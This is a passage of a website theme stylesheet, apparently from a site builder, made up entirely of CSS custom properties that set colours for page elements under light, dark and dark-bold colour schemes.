color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color:hsla(var(--black-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-quote-block-text-color:hsla(var(--black-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-background-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--black-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-title-color:hsla(var(--black-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-text-block-background-color:hsla(var(--white-hsl),1);--tweak-video-item-description-color:hsla(var(--accent-hsl),1);--tweak-video-item-meta-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-video-item-title-color:hsla(var(--accent-hsl),1);--video-grid-basic-description-color:hsla(var(--accent-hsl),1);--video-grid-basic-meta-color:hsla(var(--accent-hsl),1);--video-grid-basic-title-color:hsla(var(--accent-hsl),1);--video-grid-category-nav-color:hsla(var(--accent-hsl),1);}.dark {--announcement-bar-background-color:hsla(var(--lightAccent-hsl),1);--announcement-bar-text-color:hsla(var(--black-hsl),1);--backgroundOverlayColor:hsla(var(--darkAccent-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--black-hsl),1);--course-item-nav-background-color:hsla(var(--black-hsl),1);--course-item-nav-border-color:hsla(var(--white-hsl),0.25);--course-item-nav-text-color:hsla(var(--white-hsl),1);--course-list-course-progress-bar-color:hsla(var(--accent-hsl),1);--course-list-course-item-background:hsla(var(--white-hsl),1);--course-list-course-item-hover-background:hsla(var(--white-hsl),0.9);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--accent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--white-hsl),0.9);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--accent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--white-hsl),1);--headingLargeColor:hsla(var(--white-hsl),1);--headingLinkColor:hsla(var(--lightAccent-hsl),1);--headingMediumColor:hsla(var(--white-hsl),1);--headingSmallColor:hsla(var(--white-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--darkAccent-hsl),0);--image-block-card-image-title-color:hsla(var(--white-hsl),1);--image-block-card-inline-link-color:hsla(var(--white-hsl),1);--image-block-collage-background-color:hsla(var(--white-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--darkAccent-hsl),0);--image-block-collage-image-title-color:hsla(var(--black-hsl),1);--image-block-collage-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-title-color:hsla(var(--white-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--white-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--darkAccent-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--darkAccent-hsl),0);--image-block-stack-image-title-color:hsla(var(--white-hsl),1);--image-block-stack-inline-link-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--white-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--white-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--black-hsl),1);--list-section-carousel-description-color:hsla(var(--white-hsl),1);--list-section-carousel-title-color:hsla(var(--white-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--white-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--black-hsl),1);--list-section-simple-description-color:hsla(var(--white-hsl),1);--list-section-simple-title-color:hsla(var(--white-hsl),1);--list-section-title-color:hsla(var(--white-hsl),1);--menuOverlayBackgroundColor:hsla(var(--darkAccent-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--white-hsl),1);--navigationLinkColor:hsla(var(--white-hsl),1);--paragraphLargeColor:hsla(var(--white-hsl),1);--paragraphLinkColor:hsla(var(--safeLightAccent-hsl),1);--paragraphMediumColor:hsla(var(--white-hsl),1);--paragraphSmallColor:hsla(var(--white-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--white-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--darkAccent-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--white-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--white-hsl),1);--portfolio-hover-static-title-color:hsla(var(--white-hsl),1);--portfolio-index-background-title-color:hsla(var(--white-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeLightAccent-hsl),1);--section-inset-border-color:hsla(var(--darkAccent-hsl),1);--shape-block-background-color:hsla(var(--white-hsl),1);--shape-block-dropshadow-color:hsla(var(--white-hsl),1);--shape-block-stroke-color:hsla(var(--safeLightAccent-hsl),1);--siteBackgroundColor:hsla(var(--darkAccent-hsl),1);--siteTitleColor:hsla(var(--white-hsl),1);--social-links-block-main-icon-color:hsla(var(--white-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--darkAccent-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--white-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--text-highlight-color:hsla(var(--safeLightAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--white-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--white-hsl),1);--tweak-blog-item-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-blog-item-title-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--white-hsl),1);--tweak-content-link-block-title-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-form-block-background-color:hsla(var(--white-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--white-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-description-color:hsla(var(--white-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-option-color:hsla(var(--white-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--white-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-title-color:hsla(var(--white-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--black-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--white-hsl),1);--tweak-form-block-field-border-color-hsl:var(--white-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--white-hsl),1);--tweak-form-block-field-input-color-hsl:var(--white-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--darkAccent-hsl),1);--tweak-gallery-icon-color:hsla(var(--white-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--darkAccent-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--white-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--black-hsl),1);--tweak-line-block-line-color:hsla(var(--white-hsl),1);--tweak-marquee-block-background-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--white-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--black-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--white-hsl),1);--tweak-menu-block-nav-color:hsla(var(--white-hsl),1);--tweak-menu-block-title-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--white-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--black-hsl),1);--tweak-quote-block-text-color:hsla(var(--white-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-background-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--white-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--white-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-title-color:hsla(var(--white-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-text-block-background-color:hsla(var(--white-hsl),1);--tweak-video-item-description-color:hsla(var(--white-hsl),1);--tweak-video-item-meta-color:hsla(var(--white-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-video-item-title-color:hsla(var(--white-hsl),1);--video-grid-basic-description-color:hsla(var(--white-hsl),1);--video-grid-basic-meta-color:hsla(var(--white-hsl),1);--video-grid-basic-title-color:hsla(var(--white-hsl),1);--video-grid-category-nav-color:hsla(var(--white-hsl),1);}.dark-bold {--announcement-bar-background-color:hsla(var(--accent-hsl),1);--announcement-bar-text-color:hsla(var(--safeInverseAccent-hsl),1);--backgroundOverlayColor:hsla(var(--darkAccent-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--black-hsl),1);--course-item-nav-background-color:hsla(var(--black-hsl),1);--course-item-nav-border-color:hsla(var(--white-hsl),0.25);--course-item-nav-text-color:hsla(var(--white-hsl),1);--course-list-course-progress-bar-color:hsla(var(--accent-hsl),1);--course-list-course-item-background:hsla(var(--white-hsl),1);--course-list-course-item-hover-background:hsla(var(--white-hsl),0.9);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--accent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--safeLightAccent-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--white-hsl),0.9);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--accent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--safeLightAccent-hsl),1);--headingLargeColor:hsla(var(--safeLightAccent-hsl),1);--headingLinkColor:hsla(var(--safeLightAccent-hsl),1);--headingMediumColor:hsla(var(--safeLightAccent-hsl),1);--headingSmallColor:hsla(var(--safeLightAccent-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--darkAccent-hsl),0);--image-block-card-image-title-color:hsla(var(--white-hsl),1);--image-block-card-inline-link-color:hsla(var(--white-hsl),1);--image-block-collage-background-color:hsla(var(--white-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--darkAccent-hsl),0);--image-block-collage-image-title-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-inline-link-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-title-color:hsla(var(--white-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--white-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--darkAccent-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--darkAccent-hsl),0);--image-block-stack-image-title-color:hsla(var(--white-hsl),1);--image-block-stack-inline-link-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--white-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-description-color:hsla(var(--white-hsl),1);--list-section-carousel-title-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--white-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-description-color:hsla(var(--white-hsl),1);--list-section-simple-title-color:hsla(var(--safeLightAccent-hsl),1);--list-section-title-color:hsla(var(--safeLightAccent-hsl),1);--menuOverlayBackgroundColor:hsla(var(--darkAccent-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--safeLightAccent-hsl),1);--navigationLinkColor:hsla(var(--safeLightAccent-hsl),1);--paragraphLargeColor:hsla(var(--white-hsl),1);--paragraphLinkColor:hsla(var(--safeLightAccent-hsl),1);--paragraphMediumColor:hsla(var(--white-hsl),1);--paragraphSmallColor:hsla(var(--white-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--safeLightAccent-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--darkAccent-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--white-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--safeLightAccent-hsl),1);--portfolio-hover-static-title-color:hsla(var(--safeLightAccent-hsl),1);--portfolio-index-background-title-color:hsla(var(--white-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeLightAccent-hsl),1);--section-inset-border-color:hsla(var(--darkAccent-hsl),1);--shape-block-background-color:hsla(var(--white-hsl),1);--shape-block-dropshadow-color:hsla(var(--white-hsl),1);--shape-block-stroke-color:hsla(var(--safeLightAccent-hsl),1);--siteBackgroundColor:hsla(var(--darkAccent-hsl),1);--siteTitleColor:hsla(var(--s